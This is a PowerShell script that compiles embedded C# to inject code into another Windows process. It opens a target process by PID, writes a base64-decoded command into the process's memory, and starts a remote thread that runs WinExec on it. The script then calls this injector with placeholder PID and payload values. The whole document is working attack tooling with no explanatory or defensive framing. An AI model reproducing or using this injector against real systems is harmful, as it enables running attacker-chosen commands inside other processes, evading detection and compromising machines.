$Injector = @"
using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;

namespace Injector
{
    public class Injector
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


        static public void Inject(int pid, byte[] cmd)
        {
            IntPtr hProc = OpenProcess(0x1f0fff, false, pid);
            if (hProc != IntPtr.Zero)
            {
                IntPtr hWinExec = GetProcAddress(GetModuleHandle("kernel32.dll"), "WinExec");
                IntPtr mem = VirtualAllocEx(hProc, IntPtr.Zero, (uint)cmd.Length, (uint)0x1000 | 0x2000, (uint)0x4);
                if (mem != IntPtr.Zero)
                {
                    UIntPtr written;
                    if (WriteProcessMemory(hProc, mem, cmd, (uint)cmd.Length, out written))
                    {
                        IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, hWinExec, mem, 0, IntPtr.Zero);
                        if (hThread != IntPtr.Zero)
                        {
                            Console.WriteLine("Process inject to PID {0}. HANDLE = {1}", pid, hThread);
                        }
                        else
                        {
                            Console.WriteLine("CreateRemoteThread failed");
                        }
                    }
                    else
                    {
                        Console.WriteLine("WriteProcessMemory failed");
                    }
                }
                else
                {
                    Console.WriteLine("VirtualAllocEx failed");
                }
            }
            else
            {
                Console.WriteLine("OpenProcess failed");
            }
        }
    }
}
"@

Try {
    Add-Type -TypeDefinition $Injector -Language CSharp
} Catch {
    Write-Output "CSharp already loaded"
}
[Injector.Injector]::Inject([PID], [Convert]::FromBase64String("[PAYLOAD]"));
